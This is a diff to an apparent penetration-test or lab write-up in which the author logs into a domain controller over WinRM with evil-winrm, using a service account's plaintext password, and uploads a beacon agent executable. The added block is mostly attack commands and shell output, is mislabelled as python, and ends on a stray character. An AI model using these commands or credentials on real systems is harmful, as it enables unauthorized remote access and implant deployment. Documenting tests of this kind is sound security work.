@@ -648,5 +648,15 @@ This user also has access over winrm
 Ive generated the beacon to go on the target
 
 ```python
-
+evil-winrm -i dc02.corp.darkhaven.tech -u 'ldap_svc' -p 'D@rkhav3nLDAP2024!'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\ldap_svc\Documents> upload dc02-corp-agent.x64.exe
 ```
+T
